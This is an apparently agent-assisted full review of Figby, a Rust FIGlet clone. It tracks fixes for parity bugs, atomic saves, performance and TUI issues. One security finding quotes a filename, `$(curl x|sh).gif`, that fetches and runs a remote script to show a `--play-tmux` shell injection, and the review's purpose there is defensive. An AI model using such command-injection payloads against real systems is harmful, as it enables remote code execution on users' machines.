# Figby Full Review — 2026-11-04

Scope: the whole repo. That means the `figby-rs/` crate (library, CLI, TUI and WASM
cfgs), the `figseq` workspace crate, tests, CI, packaging assets and docs.
Base: `claude/laughing-brahmagupta-womo5v` @ `3dcfb97` (package version 6.2.1).

**Method:** I didn't trust the earlier reviews' conclusions. Every finding
below was **reproduced by running code** or confirmed by reading the cited
line. Where I couldn't execute something, the finding says so. The reference
was a C FIGlet 2.2.5 built from `c-figlet/` (with `-DTLF_FONTS`) and diffed
against the Figby debug binary.

**Severity key:** 🔴 bug users will hit / security · 🟠 correctness or data-safety
gap · 🟡 smell, drift, test gap · 🔵 suggestion

---

## Fix status

| Item | Status |
|---|---|
| F1 Latin-1 input | ✅ fixed in 6.2.2 (`control.rs` G1 default `0x80`) |
| F2 `-C utf8` no-op | ✅ fixed in 6.2.2 (`run()` dispatches on `ControlState::multibyte`) |
| F3 `-C name` lookup | ✅ fixed in 6.2.2 (`control::resolve_control_file`) |
| F6 `--to-file` / `--output` | ✅ fixed in 6.2.2 (text and templates, atomic write) |
| T2 regression scenarios | ✅ partly done: scenarios 66–69, plus `--to-file` and missing-control-file tests |
| **N1** SS2/SS3 restored GL/GR *before* decoding the shifted char | ✅ found and fixed while doing F1. The old `0x01` default had hidden it |
| **N2** wasm32 build broken on `HEAD` (lib and bin), so the CI `wasm` job was red | ✅ fixed in 6.2.2 |
| **N3** `tests/res037.txt` no longer matches C output for `-m191` | open, part of T1 (stale known-divergence bookkeeping) |
| F8 non-atomic figmap/figseq saves | ✅ fixed in 6.2.3 |
| F9 no Save on quit outside the font editor | ✅ fixed in 6.2.3. It was worse than reported: **Enter/Y discarded the work** |
| F11 TUI can't open Latin-1 fonts | ✅ fixed in 6.2.3, together with F7b (U+FFFD glyphs) |
| F14 atomic writes reset permissions | ✅ fixed in 6.2.3 |
| **N4** Esc in Save As still saved, to `./untitled.flf` with no overwrite prompt, then quit if it came from the quit prompt | ✅ found while doing F9, fixed in 6.2.3 |
| S1 `--play-tmux` shell injection | ✅ fixed in 6.2.4. Verified end to end in tmux: the old string runs `$(…)` in a filename, the new one passes it through literally |
| **N6** `--play-tmux` never split a pane on tmux 3.4 (`-pN` gives "size missing"), so it always fell back to daemon mode | ✅ fixed in 6.2.4 |
| F5 argv-order precedence | ✅ fixed in 6.2.5, via clap indices (`parse_cli`) and C's getopt switch (`apply_opt`) |
| F4 multiple `-C`, `-N` clearing | ✅ fixed in 6.2.5 |
| F7 strict font loader | ✅ fixed in 6.2.5. 160/160 truncated-font renders match C |
| F7c `-w 0`/`-w -5`, `-f x.flf`, `-m abc`, missing default font | ✅ fixed in 6.2.5. The embedded `standard` font is the last fallback. `-v` still prints Figby's own version, which is intentional |
| **N7** C drops a font file's last line when it has no trailing newline (`myfgets` returns NULL), so the final glyph row renders empty | intentional divergence: Figby keeps the row. Document it in step 5 (T1) |
| T1 tautological parity sync test | ✅ fixed in 6.2.6. It now reads `#[ignore]` from source, and a mutation check showed it catches drift |
| N3 `res037` regenerated wrong | ✅ fixed in 6.2.6 (row 37's input was double-escaped) |
| T3 upstream parity not in CI | ✅ done in 6.2.6: `scripts/cparity-diff.sh` plus a `cparity` job. It flags 13 diffs on the pre-step-4 binary |
| **N8** CI was red on `master`: fontconfig missing on Linux, unix-only tests on Windows, unversioned `figseq` dependency in `cargo package`, and the wasm break (N2) | ✅ fixed in 6.2.6, verified locally. Actions hasn't run since 2026-10-07, so not yet confirmed on GitHub |
| **N9** `-p` with a multibyte input mode lost the first character of each line | ✅ found by the new differential, fixed in 6.2.6 |
| **N10** C's UTF-8 reader swallows the byte after a broken sequence | intentional divergence, documented in the README |
| P1 quadratic rendering | ✅ fixed in 6.2.7: a 33k-char line now takes 0.028 s (was 35.7 s; C takes 2.9 s), and RTL 0.036 s (C 10.2 s). Output is byte-identical (cparity 463/463) |
| **N5** quit-prompt mouse targets were hard-coded columns, so with Save hidden a click on the Save position discarded | ✅ fixed in 6.2.3 |
| D1 duplicate crossterm | ✅ fixed in 6.2.8: `ratatui::crossterm` everywhere, so only 0.29 is built. Also `rand` 0.9 (shared with proptest). `lru` 0.16 is wasm-only (ratzilla). `image` 0.24 stays because `rascii_art` pins it, so bumping it would add a copy rather than remove one; that's under D2 with `serde_yaml` |
| A3 dead config | ✅ fixed in 6.2.8: removed `cli.color_mode` and `[tui.particles]`. Old files still load (unknown keys are ignored; there's a test) |
| U1 welcome Shift+letter | ✅ fixed in 6.2.8, verified in tmux |
| U2 duplicate startup tab | ✅ fixed in 6.2.8: New Image and welcome "New" reuse the untouched startup document, which also takes the new kind. The dirty dot before any edit doesn't reproduce at HEAD (tmux: fresh start, resize, Create Image, then quit with no prompt). The status bar's `Dirty` is the render mode, not the unsaved flag |
| U3 Nerd Font only | ✅ fixed in 6.2.8: `FIGBY_ICONS=ascii` / `[tui] icons`, documented in the README, plus the `tool_flood_fill` glyph. Nerd stays the default: a Nerd Font can't be detected reliably, and switching the default would change the look for current users |
| R1 version identity | ✅ fixed in 6.2.8: README 6.2.x, changelog 6.0.50 – 6.2.x, `CLAUDE.md` milestone |
| R2 stale file maps | ✅ fixed in 6.2.8: one map, in `AGENTS.md`, with no line counts |
| R3 YAML sketches in `assets/templates` | ✅ fixed in 6.2.8: renamed `.ftmp.draft`, plus a README |
| R4 docs sprawl | ✅ partly done in 6.2.8: added the `docs/README.md` index and moved the root strays into `docs/`. The agent memory and logs were **not** moved to `docs/agent/`, because `scripts/ralph.sh`, `skills/ralph.md` and `AGENTS.md` hard-code their paths and the loop commits to them on its own branches |
| F10 unbounded reads | ✅ fixed in 6.2.9: figmap and figseq capped at 256 MiB, TTF/OTF at 128 MiB, palettes at 8 MiB. `image_to_ascii` uses the limited decoder. GIF import already streamed with cell caps |
| F12 figmap header dims | ✅ fixed in 6.2.9: the header must equal the base layer. All 20 checked-in figmaps still load (there's a test) |
| F13 image CLI exit 0 | ✅ fixed in 6.2.9: exits 1 on any failed input or a zero width/height. The URL claim is gone from `--help` |
| A5 figseq u16 cast | ✅ fixed in 6.2.9: `validate()` refuses dimensions above 65,535 |
| A1 `dispatch.rs` god object | ✅ done, unreleased: `tui/dispatch/` (9 files by concern plus `canvas_mouse.rs`). `handle_key_event` is a table of 25 `key_*` handlers returning `ControlFlow`, `handle_mouse_event` a chain of `mouse_*` handlers returning `bool`. Block bodies moved verbatim; inline tests moved with their code |
| A2 subcommands | ✅ done, unreleased: `figby play`, `bake`, `image`, `font`, `tui` (`src/cli/subcommands.rs`) fill the same `CliArgs` fields as the legacy long flags, which all still work. Only change: those five words as the *first* argument (and not run as `figlet`) are subcommands, not banner text. Playback programs moved out of `main()` into `src/cli/playback.rs` |
| Everything else | open |

Upstream `run-tests.sh` with Figby now fails only 001 and 002, the same as C
with this `fonts/` directory.

---

## Where we left off (2026-11-12, unreleased)

Since 6.2.9 (uncommitted, see CHANGELOG "Unreleased"): P2 (stop on closed stdout, a02875b),
U4 (New Image title), D2 (`serde_yaml` → `serde_yaml_ng`), R5 (submodule note), CI `fmt --all`
(a02875b), `.gitattributes` LF normalisation (Windows checkouts were failing 64 parity tests),
Windows path fix in the control-file listing test, and removal of personal host/user names from
tracked recordings and scripts. Local gates: all test binaries pass on Windows, fmt and clippy clean.
Step 8 (A1/A2) is done in the working tree, not committed (see the table above and CHANGELOG
"Unreleased"). Still open: CI on GitHub (Actions still not run) and the wasm32 clippy gate (target not
installed on this machine).

## Where we left off (2026-11-05)

Steps 1–7 of §5 are done (6.2.2–6.2.8), plus part of the small-items batch
(6.2.9). Next, in order:

1. **Rest of the batch:**
   - **P2** EPIPE: stop rendering on the first stdout write error.
     - Reproduce with `yes | head -20000 | figby | head -1`; it still renders all 20,000 lines.
     - Start from the `let _ = writeln!` / `write!` calls in `main.rs` and `flush_output_line`.
     - The image path is already done (6.2.9).
   - **U4** the panel title says "Font Editor" while the New Image dialog is open over a fresh session.
   - **D2** replace `serde_yaml` (unmaintained) with a maintained fork. `image` 0.24 can't move until
     `rascii_art` does.
   - **R5** README note on `git submodule update --init` for `figby-fonts`, or have
     `scripts/install-fonts.sh` run it.
2. **CI gap:** the fmt job runs `cargo fmt` without `--all`, so it never checks `figseq`. Add `--all`.
3. **Step 8, structural:** A1 split `tui/dispatch.rs` into per-component handlers; A2 move to
   `figby play|bake|image|font|tui` subcommands. Agree on a plan before starting; it's multi-session.
4. **Unconfirmed in CI:** GitHub Actions hasn't run since 2026-10-07. Every gate above was run
   locally only (tests, clippy native and wasm, fmt, strict rustdoc, `cparity-diff.sh` 463/463).
   Re-enable Actions to confirm.

Also still open from §3: T4 (differential fuzz job), A4 (duplicate
`--to-file`/`--output` flags), and R4's agent-file move (deliberately skipped, see the table).

## 1. Verdict

The mechanical gates are green and the codebase is clearly hardened. The
template RCE, path traversal, decoder bombs, terminal restore and atomic
writes from earlier reviews are fixed, and there are almost no production
`unwrap`s.

**The core FIGlet CLI still has several user-visible parity bugs**, and none
of the tests catch them:

1. **Non-ASCII input is mangled by default.** Latin-1 bytes come out as the
   wrong ASCII glyphs. (§3, F1)
2. **`-C utf8` does nothing.** UTF-8 input mode can't be reached from the CLI,
   so the README's "UTF-8: Native" claim is false today. (F2)
3. **`-C <name>` only works with a literal path.** `-C uskata` fails, unlike
   in C. (F3)
4. **`--to-file` / `--output` are silently ignored** for normal text output. (F6)

All four are small, local fixes. Each one slipped through because the
differential suite always passes `-C fonts/x.flc` paths and has no
non-ASCII-input scenario.

The TUI survived the smoke test (open, create image, paint, resize to 3×2,
quit). Its main problems are architectural (dispatch god-functions) and two
data-safety gaps: project saves aren't atomic (F8), and quit has no "save"
option outside the font editor (F9).

---

## 2. Gate status (verified on this machine)

| Gate | Result |
|---|---|
| `cargo build --all-targets` | ✅ clean |
| `cargo test` | ✅ **1,639 passed, 0 failed, 0 ignored** across 13 test binaries (lib 1,335) |
| `cargo clippy --all-targets --all-features -D warnings` | ✅ 0 warnings |
| `cargo fmt --check` | ✅ clean |
| Upstream `run-tests.sh` with Figby as `$CMD` | 25/27 pass. 001/002 also fail for C here because `fonts/` has extra fonts. **025/026 fail only for Figby** (F3) |
| Differential sweep: 19 fonts × 14 flag sets × `tests/input.txt` | ✅ 266/266 byte-identical to C |

Environment note: the container's toolchain didn't ship `rustfmt`/`clippy`
(it needed `rustup component add`). That's not a repo issue.

---

## 3. Findings

### 3.1 FIGlet CLI parity and correctness

**F1 🔴 Latin-1 / high-byte input renders as the wrong glyphs.**
`control.rs:36`: `ControlState::default()` sets `gn: [0x00, 0x01, 0, 0]`.
C FIGlet initialises `gn[1] = 0x80`. The GR branch (`control.rs:181`) returns
`gn[gr] | (ch & !0x80)`, so byte `0xE9` (é) becomes `0x69` and byte `0xC3`
becomes `0x43` ('C').
Repro: `printf '\xc3\xa9' | figby`. C prints the Latin-1 glyphs `Ã©`. Figby
prints `C)`. Every accented character typed in a UTF-8 terminal comes out as
the wrong ASCII glyphs.
Fix: `gn: [0, 0x80, 0, 0]`. Add a `\xe9` scenario to `tests/cparity/scenarios.tsv`.

**F2 🔴 Control-file input modes (`u`, `h`, `j`, `b`, `f`) are never applied.**
`read_control` sets `state.multibyte` (`control.rs:501-513`). But `main.rs:953`
dispatches on `config.multibyte`, which can only ever be 0. So `-C utf8` is a
no-op and UTF-8/HZ/Shift-JIS/DBCS decoding (`input.rs`) is dead code on the
CLI path.
Repro: `printf 'é' | figby -C fonts/utf8.flc` gives the same wrong output as F1.
`figlet -C utf8` prints `é`.
Fix: after loading control files, `config.multibyte = control_state.multibyte`,
or match on `control_state.multibyte`. Also fix the README claim
"Multi-byte (UTF-8): Native" (`README.md:226`). Today UTF-8 isn't even
*optional*.

**F3 🔴 `-C name` isn't resolved like C's `FIGopen`.**
`control.rs:437` does `File::open(path)` directly. C searches the font
directory and appends `.flc`. So `figby -C uskata`, `-C utf8` and
`-C jis0201` all fail with "Error reading control file: … No such file".
Upstream tests 025 and 026 fail for this reason. The Rust suite passes them
only because `run_tests.rs:329,336` pass `fonts/uskata.flc`.
Fix: reuse `font_candidates()`-style resolution with the `.flc` suffix and
`fontdirs`.

**F4 🟠 Multiple `-C` options are rejected.**
C accumulates a control-file list (`-C a -C b`, cleared by `-N`). Here
`controlfile: Option<String>` (`main.rs:277`) makes clap error out with
"cannot be used multiple times".
Fix: use `Vec<String>`, apply the files in order, and make `-N` clear the list.

**F5 🟠 Option precedence is fixed by code order, not by argv order.**
`CliConfig::from_args_with_config` (`main.rs:439-520`) checks the boolean
flags in a hard-coded sequence. C's getopt loop means "last flag wins".
Divergences I reproduced against C:

| argv | C | Figby |
|---|---|---|
| `-c -l` | left | center |
| `-s -k` | kerning | font default |
| `-o -W` | full width | overlap |
| `-E -D` | Deutsch on | Deutsch off |

From reading the code (it needs a TTY, so I couldn't reproduce it here),
`-w 30 -t` has the same problem: `-w` always beats `-t`.

Fix: walk the clap `ArgMatches` indices (`matches.indices_of`), or do a small
manual getopt pass for the FIGlet short flags.

**F6 🔴 `--to-file` and `--output` are ignored for text rendering.**
`--to-file` is parsed into `config.to_file` (`main.rs:542`) and never read.
`--output` only applies to `--bake` and `--create-font`.
Repro: `figby --to-file out.txt Hi` prints to stdout and creates no file.
Fix: route `run()`'s writer through the file when either flag is set (use
`atomic_write`), or remove `--to-file` and say in `--output`'s help that it
covers text rendering.

**F7 🟠 The font loader is stricter than C and rejects real-world fonts.**
`parse_char_data` (`font.rs:197-224`) returns a hard error if the file ends
before all 95 ASCII glyphs plus 7 Deutsch glyphs are read. C's `readfontchar`
treats missing rows as empty and still loads the font.
Repro: a copy of `standard.flf` truncated after the 95 ASCII glyphs renders in
C. Figby says "parsed 0 Deutsch chars, need 6 more rows for code 196". The
same happens for a font truncated mid-alphabet.
Fix: treat EOF in the required block as empty glyphs. Optionally warn on
stderr.

**F7b 🟡 Latin-1 bytes inside font files become U+FFFD.**
`font.rs:641,643` decode with `from_utf8_lossy`. Three bundled fonts aren't
UTF-8: `bubble.flf`, `digital.flf` and `term.flf` (Deutsch glyphs). With
`-D -f term`, `[` prints `EF BF BD` (�) where the font contains the byte
`0xC4`.
Fix: decode `flf2a` files as Latin-1 when they aren't valid UTF-8. Keep UTF-8
for `tlf2a`.

**F7c 🟡 Smaller CLI divergences:**
- `-w 0` and `-w -5`: C ignores non-positive widths (`columns > 0`). Figby
  takes `-w 0` as width 0 and prints each glyph as its own banner row, and
  rejects `-w -5` as an unknown argument.
- `-f slant.flf` fails ("could not find font 'slant.flf'"). C strips the
  suffix. `-f fonts/slant.flf` works.
- `-m abc` is a hard error. C's `atoi` treats it as 0. This is defensible,
  but it's a divergence.
- `-v` prints `figby 6.2.1` instead of the FIGlet banner. This is probably
  intentional; document it.
- The default font dir is `/usr/share/figlet`, then `/usr/local/share/figlet`.
  After `cargo install`, `figby Hi` fails with "could not find font
  'standard'" unless the fonts are installed. `standard.flf` is already
  embedded (`assets/fonts/standard.flf`), so use it as the last fallback.

### 3.2 Security

**S1 🟠 Shell injection via `--play-tmux`.**
`main.rs:1572-1582` builds the command as
`format!("{} --play \"{}\"", exe.display(), path)` and passes it to
`tmux split-window`, which runs it through `sh -c`. Inside double quotes, the
shell still expands `$(…)` and backticks, and a `"` breaks out of the quoting.
So a file named `$(curl x|sh).gif` executes when someone runs
`figby --play-tmux *.gif` over downloaded files. An exe path containing spaces
also breaks.
*(Confirmed by reading the code. I didn't run it, on purpose.)*
Fix: pass argv separately (`tmux split-window -h -p50 -- exe --play path`),
because tmux ≥ 3.0 execs multiple arguments without a shell. Otherwise
single-quote-escape both the exe and the path.
Related: the daemon, tmux and detach modes forward only `--loop`. They drop
`--play-width`, `--hold-last` and `--play-inline`.

**S2 🟡 The TUI runs `git rev-parse` in the CWD on every launch**
(`app_state.rs:1433`). It's low risk, but it costs a process spawn per `TuiApp::new()`, including
in every unit test, and it runs `git` inside whatever (possibly untrusted)
directory the user launched from.
Suggestion: make it lazy, only when the status bar shows the branch, and
time-box it.

**Verified fixed (spot checks):** `$(…)` is never executed and `${VAR}` is
opt-in (`template.rs:162-196`, with tests). `atomic_write` refuses symlinks
and uses `create_new` temp files. ZIP entries and font bytes are bounded.
The canvas budgets are shared.

### 3.3 Data safety and robustness

**F8 🟠 Project saves aren't atomic, even though the claim says they are.**
`atomic_io.rs:3` says *"All user-facing writes … go through atomic_write"*.
But `figmap::save_figmap` (`figmap.rs:192`), which is the TUI's primary
project format and is called from `dispatch.rs:2539`, and
`figseq::save_figseq` (`figseq/src/lib.rs:550`) both use `std::fs::write`.
A crash or full disk mid-save truncates the user's project, and the write
follows symlinks.
Fix: use `atomic_write` in both. `figseq` can't depend on `figby`, so add a
10-line temp-file-plus-rename helper there.

**F9 🟠 Quitting with unsaved changes offers no "Save" outside the font editor.**
`overlays.rs:208`: `can_save = mode == FontEditor && font.is_some()`. In
Image or Animation mode the dialog is just "[N] Discard and quit / [C] Cancel".
I reproduced this in the TUI. The remediation checklist marks F-08 ("image
Save-and-Quit") as done, but this path still doesn't offer it.
Fix: offer `[Y] Save` whenever the active document has a save target. Fall
back to Save As when it has no path.

**F10 🟡 Unbounded reads on user-opened files.**
These still read whole files with no cap (cf. F-21 "bounded readers
everywhere"): `figmap.rs:198` (`read_to_string`), `figseq/src/lib.rs:556`,
`font_gen.rs:576`, `palette_editor.rs:285` and `image_input.rs:231`
(`image::open` in the public `image_to_ascii` API, with no decoder limits).
Fix: route them through `bounded_io::read_bounded` and `image::io::Reader`
with `Limits`.

**F11 🟠 The TUI can't open three of the bundled fonts.**
`dispatch.rs:2615` opens fonts with `std::fs::read_to_string`, which fails on
non-UTF-8 files. `fonts/bubble.flf`, `digital.flf` and `term.flf` are
Latin-1, so **Open Font** errors with "stream did not contain valid UTF-8".
The CLI path uses `from_utf8_lossy` and works.
*(Confirmed by reading the code.)*
Fix: share the CLI's `load_font` byte path, plus F7b.

**F12 🟡 `.figmap` header dimensions aren't authoritative.**
A figmap whose header says 64×24 but whose layer buffer is 1×1 bakes as 1×1
without a warning. A 100000×100000 header is accepted and ignored. This is
harmless today, but it's an invariant nobody checks.
Fix: validate that the layer dims equal the header in `load_figmap`.

**F13 🟡 Image CLI errors exit 0.**
`main.rs:696,704,742,768` print an error and `continue`, so a missing file,
a URL or a decode error all return status 0. `--help` advertises
"path(s) **or URL(s)**" (`main.rs:316`), but URLs are rejected.
`--width 0` prints nothing and still exits 0.
Fix: return a non-zero exit code if any input failed, and drop "URL(s)" from
the help.

**F14 🟡 `atomic_write` drops the destination's permissions.**
The temp file is created with the default mode, so saving over a `0600` file
leaves it `0644` (umask permitting).
Fix: copy `metadata.permissions()` from the existing destination before the
rename.

### 3.4 Performance

**P1 🟠 Rendering is quadratic with a heavy constant.**
For every input character, `add_char` (`render.rs:149-205`) collects each
output row into a fresh `Vec<char>`, re-collects the glyph rows, and
re-counts `chars()` for `outlinelen`. `calc_smush_amount` collects every
output row again (`last_non_space`).
Measured on one 33,000-character line with `-w 400000`:

| Build | Time |
|---|---|
| C | 3.5 s |
| Figby debug | 10 m 21 s |
| Figby release | 35.7 s (about 10× slower than C) |

The outputs are byte-identical. Normal 80-column use is fine because lines
are short, but paragraph mode (`-p`) on big inputs and the TUI's Text tool
pay this cost.
Fix: keep `output_rows` as `Vec<Vec<char>>` for the whole line, track
`outlinelen` incrementally, and scan only the last `currcharwidth` columns
when computing the smush amount.

**P2 🔵 Writes after EPIPE are ignored with `let _ = writeln!`.**
`yes | head -20000 | figby | head -1` keeps rendering all 20,000 lines after
the reader exits. Stop on the first write error.

### 3.5 TUI / UX

Smoke test (tmux, 160×48, then resized to 20×6 and 3×2, then back): no panic,
clean exit, unsaved-changes guard shown.

- **U1 🟡 Welcome hotkey labels show uppercase (`[C]reate Image`), but only
  the lowercase key works.** Shift+C is ignored. Either accept both or render
  the labels in lowercase.
- **U2 🟡 The startup "Untitled" font-editor document shows the dirty
  marker (`Untitled•`) before any edit.** Choosing *Create Image* from the
  welcome screen then opens a *second* `Untitled•` tab instead of reusing
  the empty one. (Observed. I didn't check whether a quit with no edits
  prompts.)
- **U3 🟡 Nerd Font is required, and that isn't documented or optional.**
  `assets/icons.yaml` is compiled in (`app_state.rs:20`) and has no ASCII
  fallback. Without a Nerd Font, the toolbox and layer header render as tofu
  (`…  …  🔗 …`). The README never mentions it. Also,
  `icons.yaml:15 tool_flood_fill: nf-fa-paint_bucket` is a literal name, not
  a glyph.
  Suggestion: an `icons = "ascii"|"nerd"` config switch, auto-detected or
  defaulted to ASCII.
- **U4 🟡 The panel title says "Font Editor" while the New Image dialog is
  open** over a fresh session. It's cosmetic, but it shows the mode and
  active-document state drifting apart.

### 3.6 Architecture and maintainability

Prior audits (`tui-arch-audit.md`, `ratatui_cleanup.md`) cover widget reuse
in depth, so I won't repeat that here. Current hot spots by function length:

| Function | Lines |
|---|---|
| `tui/dispatch.rs::handle_mouse_event` | 875 |
| `tui/dispatch.rs::handle_key_event` | 810 |
| `main.rs::main` | 605 |
| `tui/mod.rs::render` | 378 |
| `tui/palette_editor.rs::handle_key` | 363 |
| `tui/layers.rs::render_with_stack` | 337 |
| `tui/dispatch.rs::handle_menu_action` | 306 |
| `main.rs::run` | 300 |

- **A1 🟠 `dispatch.rs` (4,651 LOC) is the new god object.** Key and mouse
  handling are giant `match` ladders on mode × tool × dialog state. That's
  where bugs like F9 hide: each mode re-implements the guard. Next step:
  route events through each focused component's `handle_event`
  (`component.rs` already exists) and keep `dispatch` as a router.
- **A2 🟠 `main.rs` (2,530 LOC) mixes four programs:** the FIGlet CLI, the
  image converter, the font generator, and playback, daemon and tmux. F5 and
  F6 come from that flat `CliArgs` struct.
  Suggestion: keep the FIGlet short flags as the default and move the
  extensions into `figby play|bake|image|font|tui` subcommands. Keep the old
  long flags as aliases for one release.
- **A3 🟡 Dead configuration.** `[tui.particles]` (18 fields, `config.rs:30-50`)
  and `cli.color_mode` (`main.rs:433`) are parsed and never used. Wire them
  up or delete them. Today users can set them and nothing happens.
- **A4 🟡 Duplicate output flags.** `--to-file` vs `--output` (see F6).
- **A5 🔵 `figseq` split is good.** It's a clean, dependency-light crate with
  validation and a widget. One papercut: `Player::width()` and `height()` cast
  `u32` to `u16` silently (`figseq/src/lib.rs:440-445`). Validate ≤ 65,535 in
  `validate()`.

### 3.7 Tests

- **T1 🟠 The C-parity sync test is tautological.**
  `run_tests.rs:619` compares `scenarios.tsv` against a hard-coded
  `[21, 23, 26, 35, 37]`. It never checks real `#[ignore]` attributes, and
  none of those five tests are ignored today: they all run and pass. So the
  table, the hard-coded list and the README's "Known divergences" table
  (`README.md:245-256`) are all stale, and the claimed "no silent
  regression" guard doesn't exist.
  Fix: mark those rows `active`, delete the hard-coded list, and generate
  the README table from the TSV.
- **T2 🟠 No coverage of the bugs above.** There's no scenario with non-ASCII
  input, a bare `-C name`, a control-file `u` mode, argv-order precedence,
  `--to-file`, or a truncated font. Add them to `scenarios.tsv` and to the
  upstream-style `run-tests.sh`.
- **T3 🟡 Running the upstream script is manual.** `run-tests.sh` hard-codes
  `CMD="c-figlet/figlet"`. A CI job that builds C FIGlet and runs the same
  script with `CMD=figby` would have caught F3 immediately. It only needs
  `gcc` and takes about 30 s.
- **T4 🔵 Add a differential fuzz job:** random byte strings × random flags,
  comparing C and Rust output. It would have found F1 and F5 in minutes.

### 3.8 Dependencies

- **D1 🟡 Two copies of `crossterm`.** Figby depends on 0.28 directly, and
  ratatui 0.30 pulls in 0.29. Use `ratatui::crossterm` (the re-export) so
  there's one copy, one event reader and one raw-mode implementation.
- **D2 🟡 Deprecated or stale crates:** `serde_yaml 0.9.34+deprecated`
  (unmaintained, a direct dependency) and `ansi_term 0.12` (unmaintained,
  pulled in by `rascii_art`).
  There are also duplicate `rand` 0.8 / 0.9 and `lru` 0.16 / 0.18, and
  `image` 0.24 (0.25 is current and has better `Limits`).
- CI runs `cargo audit` as a gate. Good.

### 3.9 Docs and process drift

- **R1 🟡 Version identity is inconsistent.** Cargo says `6.2.1`. The README
  says "currently `6.0.x`" (`README.md:264`). `CHANGELOG.md` has no 6.1 or
  6.2 sections: the newest dated entry is 6.0.49, with a large
  `[Unreleased]` above it. `CLAUDE.md:44` says the current milestone is v6,
  while `docs/todo.md` says v6 is complete and v7.1 and v8 are active.
- **R2 🟡 `AGENTS.md` file map is stale** (for example, `tui/mod.rs ~774 LOC`
  is actually 857). The `CLAUDE.md` source layout omits `dispatch.rs`,
  `app_state.rs`, `figmap.rs`, `figseq` and others.
- **R3 🟡 Two of the three files in `assets/templates/` aren't valid templates.**
  `figby-30w.ftmp` and `figby-cli-h1.ftmp` are YAML design sketches.
  `figby -T` fails on them with a TOML parse error. Move them to `docs/` or
  rename them `.ftmp.draft`.
- **R4 🟡 Docs folder sprawl.** About 1.2 MB of agent logs (`ralph-log.md`
  238 KB, `memory.md` 199 KB, `learnings.md` 130 KB) sit next to the user
  docs, along with nine e2e checklists and five overlapping reviews. Root
  also has `handoff.md` and `5.0-manual-testing-notes.md`.
  Suggestion: move agent memory and logs into `docs/agent/` and add a
  `docs/README.md` index that marks which reviews have been superseded.
  This document supersedes nothing: it's a fresh pass. Earlier fix lists
  stay valid wherever they're checked off.
- **R5 🔵 `figby-fonts` is a submodule that's empty in a normal clone.** The
  README should mention `git submodule update --init`, or
  `scripts/install-fonts.sh` should do it.

---

## 4. What's in good shape

- The **render engine is faithful**: byte-identical to C across 266
  font × flag combinations, including RTL, all smush rules, paragraph mode
  and TLF.
- **Hardening is real**: `bounded_io`, `sanitize`, `atomic_io`, ZIP caps,
  checked control-file numerics, iterative ISO-2022 and HZ parsing, a panic
  hook and RAII terminal restore. There are only 8 `unwrap`/`expect` calls in
  production code, and all of them are guarded.
- **Robust loaders**: malformed `.figmap` files (mismatched layers, a huge
  header, an out-of-range `active_layer`) bake without panicking.
- **CI is broad**: fmt, clippy, tests, strict rustdoc, package dry-run, MSRV,
  Windows and macOS, wasm and audit, with pinned actions and least-privilege
  permissions.
- The **`figseq` crate split** gives embedders a clean API.

---

## 5. Recommended order

1. **Quick parity fixes (about half a day):** F1, F2, F3, F6, plus their
   scenarios (T2). These are the bugs users will hit first.
2. **Data safety:** F8 (atomic figmap/figseq saves), F9 (save on quit),
   F11 (TUI font open).
3. **Security:** S1 (`--play-tmux` argv).
4. **CLI semantics:** F5 (argv-order precedence), F4 (multiple `-C`),
   F7 (lenient font loading), F7c.
5. **Test gate:** T1 (make the sync test real), T3 (upstream script in CI).
6. **Performance:** P1.
7. **Hygiene:** D1, A3, R1–R4, U1–U3.
8. **Structural (multi-sprint):** A1 dispatch decomposition, A2 subcommands.
